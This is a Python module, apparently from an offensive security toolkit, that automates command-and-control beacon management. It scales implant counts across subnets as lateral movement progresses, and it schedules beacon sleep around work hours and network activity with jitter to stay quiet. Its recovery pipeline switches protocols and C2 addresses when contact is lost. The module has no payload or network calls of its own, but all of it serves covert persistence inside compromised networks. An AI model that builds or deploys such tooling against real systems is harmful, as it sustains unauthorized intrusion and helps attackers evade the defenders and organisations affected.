"""
C2 Automation Module - Auto-scaling, intelligent sleep scheduling, fault recovery.

This module provides:
    1. Automatic beacon scaling based on lateral movement progress
    2. Intelligent sleep scheduling based on network activity
    3. Automated fault recovery with exponential backoff
    4. Beacon distribution optimization

Core capabilities:
    - Auto beacon deployment and decommissioning
    - Network-aware sleep scheduling
    - Multi-stage recovery pipeline
    - Exponential backoff retry logic
    - Beacon distribution balancing

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import math
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class RecoveryStage(str, Enum):
    """Recovery pipeline stages."""

    RETRY = "retry"
    SWITCH_PROFILE = "switch_profile"
    SWITCH_PROTOCOL = "switch_protocol"
    SWITCH_C2_ADDRESS = "switch_c2_address"
    SLEEP_WAIT = "sleep_wait"
    SUCCESS = "success"
    FAILED = "failed"


class SleepMode(str, Enum):
    """Beacon sleep modes."""

    ACTIVE = "active"
    MODERATE = "moderate"
    SILENT = "silent"
    HIBERNATE = "hibernate"


class NetworkActivityLevel(str, Enum):
    """Network activity levels."""

    LOW = "low"
    NORMAL = "normal"
    HIGH = "high"
    PEAK = "peak"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class BeaconDeploymentConfig:
    """Beacon deployment configuration.

    Attributes:
        min_beacons: Minimum beacon count
        max_beacons: Maximum beacon count
        target_beacons: Target beacon count
        min_per_subnet: Minimum beacons per subnet
        max_per_subnet: Maximum beacons per subnet
        auto_scale_enabled: Whether auto-scaling is enabled
    """

    min_beacons: int = 2
    max_beacons: int = 20
    target_beacons: int = 5
    min_per_subnet: int = 1
    max_per_subnet: int = 5
    auto_scale_enabled: bool = True


@dataclass
class SleepSchedule:
    """Beacon sleep schedule.

    Attributes:
        mode: Current sleep mode
        base_interval_seconds: Base sleep interval
        jitter_seconds: Jitter range
        active_hours: Hours when beacon should be active
        weekend_multiplier: Sleep multiplier for weekends
        holiday_mode: Whether holiday mode is active
    """

    mode: SleepMode = SleepMode.ACTIVE
    base_interval_seconds: float = 60.0
    jitter_seconds: float = 30.0
    active_hours: Tuple[int, int] = (9, 17)
    weekend_multiplier: float = 2.0
    holiday_mode: bool = False

    def get_next_interval(self) -> float:
        """Calculate next sleep interval.

        Returns:
            Sleep interval in seconds.
        """
        import datetime

        now = datetime.datetime.now()
        hour = now.hour
        is_weekend = now.weekday() >= 5

        interval = self.base_interval_seconds

        if self.holiday_mode:
            interval *= 3.0
        elif is_weekend:
            interval *= self.weekend_multiplier

        if not (self.active_hours[0] <= hour <= self.active_hours[1]):
            interval *= 2.0

        if self.mode == SleepMode.MODERATE:
            interval *= 1.5
        elif self.mode == SleepMode.SILENT:
            interval *= 3.0
        elif self.mode == SleepMode.HIBERNATE:
            interval *= 10.0

        jitter = random.uniform(-self.jitter_seconds, self.jitter_seconds)

        return max(10.0, interval + jitter)


@dataclass
class RecoveryState:
    """Recovery process state.

    Attributes:
        beacon_id: Beacon identifier
        current_stage: Current recovery stage
        attempt_count: Number of recovery attempts
        last_attempt_time: Last attempt timestamp
        backoff_seconds: Current backoff interval
        max_attempts: Maximum recovery attempts
        cached_data: Data cached during outage
    """

    beacon_id: str = ""
    current_stage: RecoveryStage = RecoveryStage.RETRY
    attempt_count: int = 0
    last_attempt_time: float = 0.0
    backoff_seconds: float = 5.0
    max_attempts: int = 10
    cached_data: List[Dict[str, Any]] = field(default_factory=list)

    @property
    def should_retry(self) -> bool:
        """Check if should continue retrying."""
        return self.attempt_count < self.max_attempts

    def advance_stage(self) -> RecoveryStage:
        """Advance to next recovery stage.

        Returns:
            New recovery stage.
        """
        stage_order = list(RecoveryStage)
        current_index = stage_order.index(self.current_stage)

        if current_index < len(stage_order) - 3:
            self.current_stage = stage_order[current_index + 1]
        else:
            self.current_stage = RecoveryStage.FAILED

        self.attempt_count += 1
        self.last_attempt_time = time.time()

        base_backoff = 5.0
        self.backoff_seconds = base_backoff * (2 ** self.attempt_count)
        self.backoff_seconds = min(self.backoff_seconds, 3600)

        return self.current_stage

    def reset(self) -> None:
        """Reset recovery state after success."""
        self.current_stage = RecoveryStage.RETRY
        self.attempt_count = 0
        self.backoff_seconds = 5.0
        self.cached_data.clear()

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "beacon_id": self.beacon_id,
            "current_stage": self.current_stage.value,
            "attempt_count": self.attempt_count,
            "backoff_seconds": self.backoff_seconds,
            "should_retry": self.should_retry,
        }


@dataclass
class SubnetDistribution:
    """Beacon distribution across subnets.

    Attributes:
        subnet: Subnet CIDR
        beacon_count: Number of beacons in subnet
        beacon_ids: Beacon IDs in subnet
    """

    subnet: str = ""
    beacon_count: int = 0
    beacon_ids: List[str] = field(default_factory=list)


# =============================================================================
# Auto Scaler
# =============================================================================

class BeaconAutoScaler:
    """Manages automatic beacon scaling.

    Deploys new beacons based on lateral movement
    progress and maintains optimal beacon count.

    Attributes:
        _config: Deployment configuration
        _beacon_subnets: Beacon subnet mapping
        _deployment_callbacks: Deployment callbacks
    """

    def __init__(
        self,
        config: Optional[BeaconDeploymentConfig] = None,
    ) -> None:
        """Initialize the BeaconAutoScaler.

        Args:
            config: Deployment configuration.
        """
        self._config = config or BeaconDeploymentConfig()
        self._beacon_subnets: Dict[str, str] = {}
        self._deployment_callbacks: List[
            Callable[[str, str], Coroutine[Any, Any, bool]]
        ] = []

    def register_deployment_callback(
        self,
        callback: Callable[[str, str], Coroutine[Any, Any, bool]],
    ) -> None:
        """Register a beacon deployment callback.

        Args:
            callback: Async callback (subnet, beacon_id) -> bool.
        """
        self._deployment_callbacks.append(callback)

    def register_beacon(self, beacon_id: str, subnet: str) -> None:
        """Register a beacon in a subnet.

        Args:
            beacon_id: Beacon identifier.
            subnet: Subnet CIDR.
        """
        self._beacon_subnets[beacon_id] = subnet

    def remove_beacon(self, beacon_id: str) -> None:
        """Remove a beacon from tracking.

        Args:
            beacon_id: Beacon identifier.
        """
        self._beacon_subnets.pop(beacon_id, None)

    def get_subnet_distribution(self) -> List[SubnetDistribution]:
        """Get beacon distribution across subnets.

        Returns:
            List of SubnetDistribution.
        """
        subnet_map: Dict[str, List[str]] = {}

        for beacon_id, subnet in self._beacon_subnets.items():
            if subnet not in subnet_map:
                subnet_map[subnet] = []
            subnet_map[subnet].append(beacon_id)

        return [
            SubnetDistribution(
                subnet=s,
                beacon_count=len(ids),
                beacon_ids=ids,
            )
            for s, ids in subnet_map.items()
        ]

    async def evaluate_and_scale(
        self,
        current_beacon_count: int,
        lateral_movement_progress: float = 0.0,
    ) -> List[str]:
        """Evaluate scaling needs and deploy beacons.

        Args:
            current_beacon_count: Current active beacon count.
            lateral_movement_progress: Progress (0-1).

        Returns:
            List of newly deployed beacon IDs.
        """
        if not self._config.auto_scale_enabled:
            return []

        new_beacons: List[str] = []

        target = self._calculate_target_count(
            current_beacon_count, lateral_movement_progress,
        )

        if current_beacon_count < target:
            needed = min(
                target - current_beacon_count,
                self._config.max_beacons - current_beacon_count,
            )

            for _ in range(needed):
                beacon_id = await self._deploy_beacon()
                if beacon_id:
                    new_beacons.append(beacon_id)

        await self._rebalance_subnets()

        return new_beacons

    def _calculate_target_count(
        self,
        current_count: int,
        progress: float,
    ) -> int:
        """Calculate target beacon count.

        Args:
            current_count: Current count.
            progress: Lateral movement progress.

        Returns:
            Target beacon count.
        """
        base = self._config.target_beacons
        progress_bonus = int(progress * (self._config.max_beacons - base))

        target = base + progress_bonus

        return max(
            self._config.min_beacons,
            min(target, self._config.max_beacons),
        )

    async def _deploy_beacon(self) -> Optional[str]:
        """Deploy a new beacon.

        Returns:
            New beacon ID, or None.
        """
        import hashlib
        import time

        beacon_id = hashlib.md5(
            f"beacon_{time.time()}_{random.randint(0, 9999)}".encode()
        ).hexdigest()[:12]

        target_subnet = self._find_underpopulated_subnet()

        for callback in self._deployment_callbacks:
            try:
                success = await callback(target_subnet, beacon_id)
                if success:
                    self.register_beacon(beacon_id, target_subnet)
                    logger.info(
                        f"Beacon {beacon_id} deployed to {target_subnet}"
                    )
                    return beacon_id
            except Exception as e:
                logger.error(f"Beacon deployment failed: {e}")

        return None

    def _find_underpopulated_subnet(self) -> str:
        """Find subnet with fewest beacons.

        Returns:
            Target subnet CIDR.
        """
        distribution = self.get_subnet_distribution()

        if not distribution:
            return "10.0.0.0/24"

        underpopulated = [
            d for d in distribution
            if d.beacon_count < self._config.max_per_subnet
        ]

        if underpopulated:
            return min(underpopulated, key=lambda d: d.beacon_count).subnet

        return distribution[0].subnet

    async def _rebalance_subnets(self) -> None:
        """Rebalance beacons across subnets."""
        distribution = self.get_subnet_distribution()

        overloaded = [
            d for d in distribution
            if d.beacon_count > self._config.max_per_subnet
        ]

        for subnet in overloaded:
            excess = subnet.beacon_count - self._config.max_per_subnet
            logger.info(
                f"Subnet {subnet.subnet} overloaded: "
                f"{excess} beacons need redistribution"
            )

    def get_status(self) -> Dict[str, Any]:
        """Get auto-scaler status.

        Returns:
            Dictionary with status summary.
        """
        distribution = self.get_subnet_distribution()

        return {
            "total_beacons": len(self._beacon_subnets),
            "subnet_count": len(distribution),
            "distribution": [
                {"subnet": d.subnet, "count": d.beacon_count}
                for d in distribution
            ],
            "auto_scale_enabled": self._config.auto_scale_enabled,
        }


# =============================================================================
# Sleep Scheduler
# =============================================================================

class IntelligentSleepScheduler:
    """Manages intelligent sleep scheduling.

    Adjusts beacon sleep patterns based on
    network activity and time patterns.

    Attributes:
        _schedules: Beacon sleep schedules
        _activity_levels: Network activity levels
    """

    def __init__(self) -> None:
        """Initialize the IntelligentSleepScheduler."""
        self._schedules: Dict[str, SleepSchedule] = {}
        self._activity_levels: Dict[str, NetworkActivityLevel] = {}

    def create_schedule(
        self,
        beacon_id: str,
        base_interval: float = 60.0,
        active_hours: Tuple[int, int] = (9, 17),
    ) -> SleepSchedule:
        """Create a sleep schedule for a beacon.

        Args:
            beacon_id: Beacon identifier.
            base_interval: Base sleep interval.
            active_hours: Active hours tuple.

        Returns:
            Created SleepSchedule.
        """
        schedule = SleepSchedule(
            base_interval_seconds=base_interval,
            active_hours=active_hours,
        )
        self._schedules[beacon_id] = schedule
        return schedule

    def update_activity_level(
        self,
        network_id: str,
        level: NetworkActivityLevel,
    ) -> None:
        """Update network activity level.

        Args:
            network_id: Network identifier.
            level: Activity level.
        """
        self._activity_levels[network_id] = level

    def adjust_schedule_for_activity(
        self,
        beacon_id: str,
        network_id: str,
    ) -> SleepSchedule:
        """Adjust sleep schedule based on network activity.

        Args:
            beacon_id: Beacon identifier.
            network_id: Network identifier.

        Returns:
            Adjusted SleepSchedule.
        """
        schedule = self._schedules.get(beacon_id)
        if not schedule:
            schedule = self.create_schedule(beacon_id)

        activity = self._activity_levels.get(network_id, NetworkActivityLevel.NORMAL)

        if activity == NetworkActivityLevel.HIGH:
            schedule.mode = SleepMode.ACTIVE
            schedule.base_interval_seconds = 30.0
        elif activity == NetworkActivityLevel.PEAK:
            schedule.mode = SleepMode.MODERATE
            schedule.base_interval_seconds = 120.0
        elif activity == NetworkActivityLevel.LOW:
            schedule.mode = SleepMode.SILENT
            schedule.base_interval_seconds = 300.0
        else:
            schedule.mode = SleepMode.ACTIVE
            schedule.base_interval_seconds = 60.0

        return schedule

    def set_holiday_mode(self, beacon_id: str, enabled: bool) -> None:
        """Enable or disable holiday mode.

        Args:
            beacon_id: Beacon identifier.
            enabled: Whether holiday mode is enabled.
        """
        schedule = self._schedules.get(beacon_id)
        if schedule:
            schedule.holiday_mode = enabled

    def get_next_interval(self, beacon_id: str) -> float:
        """Get next sleep interval for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            Sleep interval in seconds.
        """
        schedule = self._schedules.get(beacon_id)
        if schedule:
            return schedule.get_next_interval()
        return 60.0

    def get_status(self) -> Dict[str, Any]:
        """Get sleep scheduler status.

        Returns:
            Dictionary with status summary.
        """
        mode_counts: Dict[str, int] = {}

        for schedule in self._schedules.values():
            mode = schedule.mode.value
            mode_counts[mode] = mode_counts.get(mode, 0) + 1

        return {
            "total_schedules": len(self._schedules),
            "mode_distribution": mode_counts,
            "activity_levels": {
                k: v.value for k, v in self._activity_levels.items()
            },
        }


# =============================================================================
# Fault Recovery Manager
# =============================================================================

class FaultRecoveryManager:
    """Manages automated fault recovery.

    Implements multi-stage recovery pipeline with
    exponential backoff retry logic.

    Attributes:
        _recovery_states: Beacon recovery states
        _recovery_callbacks: Recovery action callbacks
    """

    def __init__(self) -> None:
        """Initialize the FaultRecoveryManager."""
        self._recovery_states: Dict[str, RecoveryState] = {}
        self._recovery_callbacks: Dict[
            RecoveryStage,
            Callable[[str], Coroutine[Any, Any, bool]],
        ] = {}

    def register_recovery_callback(
        self,
        stage: RecoveryStage,
        callback: Callable[[str], Coroutine[Any, Any, bool]],
    ) -> None:
        """Register a recovery action callback.

        Args:
            stage: Recovery stage.
            callback: Async callback function.
        """
        self._recovery_callbacks[stage] = callback

    def start_recovery(self, beacon_id: str) -> RecoveryState:
        """Start recovery process for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            RecoveryState.
        """
        state = RecoveryState(
            beacon_id=beacon_id,
            max_attempts=10,
        )
        self._recovery_states[beacon_id] = state

        logger.info(f"Recovery started for {beacon_id}")
        return state

    async def execute_recovery_step(self, beacon_id: str) -> RecoveryStage:
        """Execute next recovery step.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            New recovery stage.
        """
        state = self._recovery_states.get(beacon_id)
        if not state:
            return RecoveryStage.FAILED

        if not state.should_retry:
            state.current_stage = RecoveryStage.FAILED
            return state.current_stage

        new_stage = state.advance_stage()

        callback = self._recovery_callbacks.get(new_stage)

        if callback:
            try:
                success = await callback(beacon_id)
                if success:
                    state.current_stage = RecoveryStage.SUCCESS
                    state.reset()
                    logger.info(f"Recovery succeeded for {beacon_id}")
                    return RecoveryStage.SUCCESS
            except Exception as e:
                logger.error(f"Recovery step failed: {e}")

        logger.info(
            f"Recovery step {new_stage.value} for {beacon_id}: "
            f"attempt {state.attempt_count}, "
            f"backoff {state.backoff_seconds:.0f}s"
        )

        return new_stage

    def cache_data(self, beacon_id: str, data: Dict[str, Any]) -> None:
        """Cache data for later retransmission.

        Args:
            beacon_id: Beacon identifier.
            data: Data to cache.
        """
        state = self._recovery_states.get(beacon_id)
        if state:
            state.cached_data.append(data)

    def get_cached_data(self, beacon_id: str) -> List[Dict[str, Any]]:
        """Get cached data for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            List of cached data items.
        """
        state = self._recovery_states.get(beacon_id)
        if state:
            return state.cached_data.copy()
        return []

    def get_recovery_state(self, beacon_id: str) -> Optional[RecoveryState]:
        """Get recovery state for a beacon.

        Args:
            beacon_id: Beacon identifier.

        Returns:
            RecoveryState, or None.
        """
        return self._recovery_states.get(beacon_id)

    def get_status(self) -> Dict[str, Any]:
        """Get fault recovery status.

        Returns:
            Dictionary with status summary.
        """
        active_recoveries = [
            s for s in self._recovery_states.values()
            if s.current_stage not in (RecoveryStage.SUCCESS, RecoveryStage.FAILED)
        ]

        return {
            "total_tracked": len(self._recovery_states),
            "active_recoveries": len(active_recoveries),
            "recoveries": [s.to_dict() for s in active_recoveries],
        }


# =============================================================================
# C2 Automation Manager
# =============================================================================

class C2AutomationManager:
    """Main C2 automation coordination engine.

    Integrates auto-scaling, sleep scheduling,
    and fault recovery.

    Attributes:
        _auto_scaler: Beacon auto-scaler
        _sleep_scheduler: Intelligent sleep scheduler
        _fault_recovery: Fault recovery manager
    """

    def __init__(
        self,
        scaling_config: Optional[BeaconDeploymentConfig] = None,
    ) -> None:
        """Initialize the C2AutomationManager.

        Args:
            scaling_config: Scaling configuration.
        """
        self._auto_scaler = BeaconAutoScaler(scaling_config)
        self._sleep_scheduler = IntelligentSleepScheduler()
        self._fault_recovery = FaultRecoveryManager()

    @property
    def auto_scaler(self) -> BeaconAutoScaler:
        """Get the auto-scaler."""
        return self._auto_scaler

    @property
    def sleep_scheduler(self) -> IntelligentSleepScheduler:
        """Get the sleep scheduler."""
        return self._sleep_scheduler

    @property
    def fault_recovery(self) -> FaultRecoveryManager:
        """Get the fault recovery manager."""
        return self._fault_recovery

    async def run_automation_cycle(
        self,
        current_beacon_count: int,
        lateral_movement_progress: float = 0.0,
    ) -> Dict[str, Any]:
        """Run a full automation cycle.

        Args:
            current_beacon_count: Current beacon count.
            lateral_movement_progress: Progress (0-1).

        Returns:
            Dictionary with cycle results.
        """
        new_beacons = await self._auto_scaler.evaluate_and_scale(
            current_beacon_count, lateral_movement_progress,
        )

        await self._check_and_recover_beacons()

        return {
            "new_beacons_deployed": len(new_beacons),
            "new_beacon_ids": new_beacons,
            "scaling_status": self._auto_scaler.get_status(),
            "sleep_status": self._sleep_scheduler.get_status(),
            "recovery_status": self._fault_recovery.get_status(),
        }

    async def _check_and_recover_beacons(self) -> None:
        """Check for beacons needing recovery."""
        for beacon_id, state in list(self._fault_recovery._recovery_states.items()):
            if not state.should_retry:
                continue

            now = time.time()
            time_since_last = now - state.last_attempt_time

            if time_since_last >= state.backoff_seconds:
                await self._fault_recovery.execute_recovery_step(beacon_id)

    def get_status(self) -> Dict[str, Any]:
        """Get automation manager status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "auto_scaler": self._auto_scaler.get_status(),
            "sleep_scheduler": self._sleep_scheduler.get_status(),
            "fault_recovery": self._fault_recovery.get_status(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_automation_manager: Optional[C2AutomationManager] = None


def get_automation_manager() -> C2AutomationManager:
    """Get the global C2AutomationManager singleton.

    Returns:
        Singleton C2AutomationManager instance.
    """
    global _automation_manager
    if _automation_manager is None:
        _automation_manager = C2AutomationManager()
    return _automation_manager


__all__ = [
    "C2AutomationManager",
    "BeaconAutoScaler",
    "IntelligentSleepScheduler",
    "FaultRecoveryManager",
    "BeaconDeploymentConfig",
    "SleepSchedule",
    "RecoveryState",
    "SubnetDistribution",
    "RecoveryStage",
    "SleepMode",
    "NetworkActivityLevel",
    "get_automation_manager",
]
